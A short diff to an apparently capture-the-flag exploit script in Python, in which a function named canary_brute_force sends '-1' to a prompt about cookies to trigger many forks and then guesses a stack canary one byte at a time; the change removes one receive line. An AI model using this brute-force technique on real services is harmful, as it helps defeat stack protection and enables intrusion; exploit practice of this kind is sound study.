@@ -65,7 +65,6 @@ def canary_brute_force():
     print(p.recvline())
     p.sendline(b'-1')    #send -1 as an answer to the "how many cookies question", to get it to provide many forks so we can brute force the canary.
     while i < 255:
-        p.recvuntil("Butter.\n")
         if x == 8:  #we brute forced 8 byte and got the canary.
             break
         p.send(payload + i.to_bytes(1,"little"))
